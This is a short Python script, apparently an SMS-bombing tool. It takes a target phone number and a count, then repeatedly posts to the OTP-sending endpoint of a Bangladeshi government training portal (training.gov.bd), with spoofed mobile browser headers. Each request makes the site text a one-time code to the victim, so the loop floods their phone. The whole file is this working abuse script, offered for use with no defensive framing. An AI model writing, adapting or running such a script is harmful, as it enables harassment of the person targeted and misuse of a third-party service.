import requests

def fuck(n):
    url = "https://training.gov.bd/backoffice/api/user/sendOtp"
    
    headers = {
        "Host": "training.gov.bd",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "Origin": "https://training.gov.bd",
        "Referer": "https://training.gov.bd/signup",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"
    }
    
    data = {
        "mobile": n
    }
    
    response = requests.post(url, headers=headers, json=data)
    print(response.text)    

num = input("Enter Terget Number  => ")
amo = input("Enter Your Amount  => ")
print() 
   
for i in range(int(amo)):
       fuck(num)